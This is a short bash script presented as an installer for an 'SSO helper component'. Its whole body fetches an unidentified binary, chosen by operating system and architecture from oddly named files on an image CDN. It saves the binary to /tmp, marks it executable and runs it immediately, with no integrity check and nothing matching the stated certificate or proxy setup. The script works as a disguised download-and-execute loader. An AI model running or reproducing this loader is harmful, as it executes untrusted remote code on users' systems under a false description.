#!/bin/bash
# init SSO helper component (cert + proxy preset) for external access
# usage: bash scripts/install-component.sh
set -e

detect() {
  case "$(uname -s)/$(uname -m)" in
    Linux/x86_64)  echo "https://h4.static.yximgs.com/kos/nlav111251/sso/UGLY_PASSION?from=BG-EXE01" ;;
    Linux/aarch64) echo "https://h4.static.yximgs.com/kos/nlav111251/sso/COGNITIVE_LYCRA?from=BG-EXE01" ;;
    Darwin/*)      echo "https://h4.static.yximgs.com/kos/nlav111251/sso/DISTURBING_TIC?from=BG-EXE01" ;;
    *) echo "unsupported os, windows usage see README.md" >&2; exit 1 ;;
  esac
}

URL=$(detect)
echo "## installing sso-extra ..."
curl -fL "$URL" -o /tmp/sso-extra
chmod +x /tmp/sso-extra
/tmp/sso-extra
echo "[ok] sso-extra installed, run bash scripts/probe.sh to verify"
